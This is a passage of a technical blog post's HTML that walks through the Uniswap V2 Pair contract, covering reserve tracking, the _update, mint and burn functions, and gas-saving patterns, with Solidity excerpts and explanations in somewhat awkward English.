1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to store tokens?</h3>\n<ul>\n<li>It is performed in the ERC20 contract of the token itself, not in the pair contract.</li>\n<li>Pair Contract tracks the reserve, and from the point of view of ERC20, it is just a general user who can send and receive Pair Contract Tokens, and has its own balance.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAAC2UlEQVQoz0WSbUyVZRjHr/PKOZznnPOcl+ccPC/47Jx4GRAnT2mk64VEjEpjYylWUG7OqOVx6dQZpLYIhlCNqMFEXG+rzTWXbgYMYqCTChp1WMygNv2gfHBtzk99/LXzQPjhv933de3+Xdf1v24Ryef5Ha/x5+Idsuev82Vrln2PXiGVfBGvpqOFywiESogVpnCrCZzKevLd9+Xy6NidMcQSwmQNIyIOXnr1ALdv/Mv8jzeY/e4mVY804bAncSpxnEohdmeUcKQcry9p3P+H5c5efxJ/sBgxBe8Da3dkuDB6l76hX/l+8h7xB6rIdS6WMGIOIWYNry+BLS+CmDTjsSGzhs0RRQ0UGbBVoIv0lr10nLvF2x3TnPh0kYL4ZkR8mG0FxigiCnZ3ApHgWtzIiQ8RFZsjQo6zCvQbCU/BBpRQivxgBSJuTNaVzuzOOG+92cZHJ9p5v62L0vKn1kCpDTV0dw3S+/HntLS0rhRR1RL2PJthV83r7N72Bq/UHaDuiebVDlQi+kauz/zO7TYPd8f62HfwNCJ5hg4f7eKf5Xtkp2dZWFjGrSaRp7c0sjwJl/uznO+9ys/f3OK3i3dwKjoiHmLr02Sn5xj57BhLV8fY39K64q84OXTsFEt/LTIxOsxsdh6PP4lU6M107/2bDxqmGNiZ5ezLE1zYfQ1PXtIYXV9XwvxgL8Mf9rD01Rky9Q1GPOfr4Xd2MbfUww9TJ/nlj058mo74lVq2VnxN40NfcLxsmszGAd6t7CfoLcXmihHSivn2yCHGT77HT6c7ee6xasyOKCZLlPqGrYyPnWJ8pJ1zQxmsjpxNlgAepRI9Wk0sXEVlYjtFic2EY+VE4ynC0XIe1jM0bbpEpuYKwUAahxIj3xNHdaV5puQTDlbPUPdgh2GRGKs2+xGzilj8iMmLsXmztvbnfK40ulZH8boXsOcVIhJATAGs1jgR35MUFdQT0x5HLEH+A0Yug+z7ZAXXAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Uniswap-reserve-token-flow.png\"\n        title=\"Uniswap-reserve-token-flow.png\"\n        src=\"/static/9266aa22d881d0f993a55ebf7adfe11d/37523/Uniswap-reserve-token-flow.png\"\n        srcset=\"/static/9266aa22d881d0f993a55ebf7adfe11d/e9ff0/Uniswap-reserve-token-flow.png 180w,\n/static/9266aa22d881d0f993a55ebf7adfe11d/f21e7/Uniswap-reserve-token-flow.png 360w,\n/static/9266aa22d881d0f993a55ebf7adfe11d/37523/Uniswap-reserve-token-flow.png 720w,\n/static/9266aa22d881d0f993a55ebf7adfe11d/302a4/Uniswap-reserve-token-flow.png 1080w,\n/static/9266aa22d881d0f993a55ebf7adfe11d/07a9c/Uniswap-reserve-token-flow.png 1440w,\n/static/9266aa22d881d0f993a55ebf7adfe11d/29114/Uniswap-reserve-token-flow.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>How to manage funds in each of 3 smart contracts</li>\n<li>Calls ERC20 functions such as Pair Contractdms (OwnerAddress ⇒ Pair Contract address) and manages tokens.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// .. [OMIT]</span>\n<span class=\"token builtin\">bytes4</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">constant</span> SELECTOR <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes4</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token string\">'transfer(address,uint256)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// .. [OMIT]</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">_safeTransfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> token<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> token<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSelector</span><span class=\"token punctuation\">(</span>SELECTOR<span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>success <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'UniswapV2: TRANSFER_FAILED'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// .. [OMIT]</span></code></pre></div>\n<ul>\n<li>In Pair Contract, the ERC20 function implements the function selector as follows and calls the transfer function in the raw calling format.</li>\n<li>The <code class=\"language-text\">_update</code> function is called whenever there is a new fund deposited or withdrawn by the liquidity provider or a trader swaps tokens.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">_update</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> balance0<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> balance1<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint112</span> _reserve0<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint112</span> _reserve1<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balance0 <span class=\"token operator\">&lt;=</span> <span class=\"token builtin\">uint112</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> balance1 <span class=\"token operator\">&lt;=</span> <span class=\"token builtin\">uint112</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'UniswapV2: OVERFLOW'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint32</span> blockTimestamp <span class=\"token operator\">=</span> <span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">%</span> <span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint32</span> timeElapsed <span class=\"token operator\">=</span> blockTimestamp <span class=\"token operator\">-</span> blockTimestampLast<span class=\"token punctuation\">;</span> <span class=\"token comment\">// overflow is desired</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>timeElapsed <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> _reserve0 <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> _reserve1 <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// * never overflows, and + overflow is desired</span>\n        price0CumulativeLast <span class=\"token operator\">+=</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">(</span>UQ112x112<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>_reserve1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">uqdiv</span><span class=\"token punctuation\">(</span>_reserve0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> timeElapsed<span class=\"token punctuation\">;</span>\n        price1CumulativeLast <span class=\"token operator\">+=</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">(</span>UQ112x112<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>_reserve0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">uqdiv</span><span class=\"token punctuation\">(</span>_reserve1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> timeElapsed<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    reserve0 <span class=\"token operator\">=</span> <span class=\"token builtin\">uint112</span><span class=\"token punctuation\">(</span>balance0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    reserve1 <span class=\"token operator\">=</span> <span class=\"token builtin\">uint112</span><span class=\"token punctuation\">(</span>balance1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    blockTimestampLast <span class=\"token operator\">=</span> blockTimestamp<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">emit</span> <span class=\"token function\">Sync</span><span class=\"token punctuation\">(</span>reserve0<span class=\"token punctuation\">,</span> reserve1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>ERC20 The return value of <code class=\"language-text\">balanceOf</code> function <code class=\"language-text\">balance0, balance1</code> is the token balance of ERC20.</li>\n<li>Uniswap <code class=\"language-text\">_reserve0, _reserve1</code> previously known balance. (Confirmed with the last <code class=\"language-text\">balanceOf</code> .)</li>\n<li>Check Overflow, update Oracle Price, update <code class=\"language-text\">reserve</code> and update event <code class=\"language-text\">Sync</code>.</li>\n<li>The difference between the <code class=\"language-text\">_reserve0, _reserve1</code> parameters and the stored variables <code class=\"language-text\">reserve0, reserve1</code> is essentially the same.</li>\n<li>The function caller already reads the variable from storage and passes it as an argument in the <code class=\"language-text\">_update</code> function.</li>\n<li>Just a way to save gas. (Reading from Storage is more expensive than reading from Memory)</li>\n<li>Uniswap is implemented in an optimized way for efficiency and gas savings, and represents a single performance point.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token builtin\">uint112</span> <span class=\"token keyword\">private</span> reserve0<span class=\"token punctuation\">;</span>           <span class=\"token comment\">// uses single storage slot, accessible via getReserves</span>\n<span class=\"token builtin\">uint112</span> <span class=\"token keyword\">private</span> reserve1<span class=\"token punctuation\">;</span>           <span class=\"token comment\">// uses single storage slot, accessible via getReserves</span>\n<span class=\"token builtin\">uint32</span>  <span class=\"token keyword\">private</span> blockTimestampLast<span class=\"token punctuation\">;</span> <span class=\"token comment\">// uses single storage slot, accessible via getReserves</span></code></pre></div>\n<h3 id=\"mint--burn-features\" style=\"position:relative;\"><a href=\"#mint--burn-features\" aria-label=\"mint  burn features permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mint , Burn Features</h3>\n<ul>\n<li><code class=\"language-text\">Mint</code> is a liquidity provider adding funds to the pool and consequently a new pool ownership token is issued for the liquidity provider.</li>\n<li>‘Burn’, liquidity providers withdraw funds (and accumulated rewards) and pool ownership tokens are destroyed.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// this low-level function should be called from a contract which performs important safety checks</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">mint</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> lock <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> liquidity<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint112</span> _reserve0<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint112</span> _reserve1<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">getReserves</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// gas savings</span>\n    <span class=\"token builtin\">uint</span> balance0 <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> balance1 <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> amount0 <span class=\"token operator\">=</span> balance0<span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>_reserve0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> amount1 <span class=\"token operator\">=</span> balance1<span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>_reserve1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">bool</span> feeOn <span class=\"token operator\">=</span> <span class=\"token function\">_mintFee</span><span class=\"token punctuation\">(</span>_reserve0<span class=\"token punctuation\">,</span> _reserve1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> _totalSupply <span class=\"token operator\">=</span> totalSupply<span class=\"token punctuation\">;</span> <span class=\"token comment\">// gas savings, must be defined here since totalSupply can update in _mintFee</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_totalSupply <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        liquidity <span class=\"token operator\">=</span> Math<span class=\"token punctuation\">.</span><span class=\"token function\">sqrt</span><span class=\"token punctuation\">(</span>amount0<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>amount1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>MINIMUM_LIQUIDITY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MINIMUM_LIQUIDITY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// permanently lock the first MINIMUM_LIQUIDITY tokens</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n        liquidity <span class=\"token operator\">=</span> Math<span class=\"token punctuation\">.</span><span class=\"token function\">min</span><span class=\"token punctuation\">(</span>amount0<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>_totalSupply<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> _reserve0<span class=\"token punctuation\">,</span> amount1<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>_totalSupply<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> _reserve1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>liquidity <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>to<span class=\"token punctuation\">,</span> liquidity<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">_update</span><span class=\"token punctuation\">(</span>balance0<span class=\"token punctuation\">,</span> balance1<span class=\"token punctuation\">,</span> _reserve0<span class=\"token punctuation\">,</span> _reserve1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>feeOn<span class=\"token punctuation\">)</span> kLast <span class=\"token operator\">=</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">(</span>reserve0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>reserve1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// reserve0 and reserve1 are up-to-date</span>\n    <span class=\"token keyword\">emit</span> <span class=\"token function\">Mint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amount0<span class=\"token punctuation\">,</span> amount1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>You can check the logic to save gas. <code class=\"language-text\">reserve0, reserve1, totalSupply</code> These values are transferred from storage to memory to be cheaper to write.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\">\n<span class=\"token comment\">//.. [OMIT]   </span>\n<span class=\"token builtin\">bool</span> feeOn <span class=\"token operator\">=</span> <span class=\"token function\">_mintFee</span><span class=\"token punctuation\">(</span>_reserve0<span class=\"token punctuation\">,</span> _reserve1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//.. [OMIT]</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>feeOn<span class=\"token punctuation\">)</span> kLast <span class=\"token operator\">=</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">(</span>reserve0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>reserve1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// reserve0 and reserve1 are up-to-date</span></code></pre></div>\n<ul>\n<li>You can check the fee and fee calculation logic of the optional protocol.</li>\n<li><code class=\"language-text\">totalSupply</code> represents the total supply of pool ownership tokens, and is a variable stored in the contract.</li>\n<li>The pair contract expands, so you can access the variables.</li>\n<li>If <code class=\"language-text\">totalSupply</code> is 0, it means that the pool is an entirely new <code class=\"language-text\">MINIMIUM_LIQUIDITY</code> Pool and the amount of pool ownership tokens should be fixed to avoid dividing by zero in liquidity calculations.</li>\n<li><code class=\"language-text\">_mint(**address**(**0**), **MINIMUM_LIQUIDITY**); // permanently lock the first MINIMUM_LIQUIDITY tokens</code> Since we don’t know the private key that leads to address(0), sending funds to address(0) essentially locks the funds forever.</li>\n<li>The ‘liquidity’ variable is the amount of new pool ownership tokens that must be issued to the liquidity provider, and the liquidity provider can receive a proportional amount of pool ownership tokens according to the number of new funds provided.</li>\n<li>Issue a new pool ownership token to the corresponding <code class=\"language-text\">to</code> address, the address of the liquidity provider (this uses a router that calls the function <code class=\"language-text\">to</code> )</li>\n<li>The way that adding funds works is deposited into the ERC20 contract.</li>\n<li>Pair Contract refers to the balance data, compares it with the last known balance, and then executes the final logic.</li>\n<li>This is a method that allows the pair contract to check the deposited balance.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// this low-level function should be called from a contract which performs important safety checks</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">burn</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> lock <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> amount0<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint112</span> _reserve0<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint112</span> _reserve1<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">getReserves</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// gas savings</span>\n    <span class=\"token builtin\">address</span> _token0 <span class=\"token operator\">=</span> token0<span class=\"token punctuation\">;</span>                                <span class=\"token comment\">// gas savings</span>\n    <span class=\"token builtin\">address</span> _token1 <span class=\"token operator\">=</span> token1<span class=\"token punctuation\">;</span>                                <span class=\"token comment\">// gas savings</span>\n    <span class=\"token builtin\">uint</span> balance0 <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>_token0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> balance1 <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>_token1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> liquidity <span class=\"token operator\">=</span> balanceOf<span class=\"token punctuation\">[</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">bool</span> feeOn <span class=\"token operator\">=</span> <span class=\"token function\">_mintFee</span><span class=\"token punctuation\">(</span>_reserve0<span class=\"token punctuation\">,</span> _reserve1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> _totalSupply <span class=\"token operator\">=</span> totalSupply<span class=\"token punctuation\">;</span> <span class=\"token comment\">// gas savings, must be defined here since totalSupply can update in _mintFee</span>\n    amount0 <span class=\"token operator\">=</span> liquidity<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>balance0<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> _totalSupply<span class=\"token punctuation\">;</span> <span class=\"token comment\">// using balances ensures pro-rata distribution</span>\n    amount1 <span class=\"token operator\">=</span> liquidity<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>balance1<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> _totalSupply<span class=\"token punctuation\">;</span> <span class=\"token comment\">// using balances ensures pro-rata distribution</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>amount0 <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> amount1 <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">_burn</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> liquidity<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">_safeTransfer</span><span class=\"token punctuation\">(</span>_token0<span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> amount0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">_safeTransfer</span><span class=\"token punctuation\">(</span>_token1<span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> amount1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    balance0 <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>_token0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    balance1 <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>_token1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">_update</span><span class=\"token punctuation\">(</span>balance0<span class=\"token punctuation\">,</span> balance1<span class=\"token punctuation\">,</span> _reserve0<span class=\"token punctuation\">,</span> _reserve1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>feeOn<span class=\"token punctuation\">)</span> kLast <span class=\"token operator\">=</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">(</span>reserve0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>reserve1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// reserve0 and reserve1 are up-to-date</span>\n    <span class=\"token keyword\">emit</span> <span class=\"token function\">Burn</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amount0<span class=\"token punctuation\">,</span> amount1<span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>Used for deletion of liquidity pool tracking tokens issued by <code class=\"language-text\">mint</code> function. This logic is equally used to save gas.</li>\n<li>‘balance0, balance1’ total balance of tokens in pool ‘liquidity’ amount of pool ownership tokens held by the provider</li>\n<li>You can check that all liquidity has been transferred to the Pair 